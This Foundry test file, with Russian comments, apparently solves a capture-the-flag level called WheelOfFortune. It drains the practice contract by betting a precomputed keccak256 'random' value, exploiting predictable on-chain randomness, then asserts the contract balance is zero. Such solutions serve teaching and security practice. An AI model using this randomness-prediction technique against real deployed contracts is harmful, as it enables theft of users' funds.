// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985); // Устанавливаем начальный номер блока
    }

    function testExploitLevel() public {
        // Рассчитываем предсказуемое значение для ставки
        uint256 predictableValue = uint256(keccak256(abi.encodePacked(bytes32(0)))) % 100;

        // Первое вращение с рассчитанным значением
        instance.spin{value: 0.01 ether}(predictableValue);

        // Второе вращение для проверки результата предыдущей игры
        instance.spin{value: 0.01 ether}(0);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        // Проверяем, что баланс контракта равен нулю
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
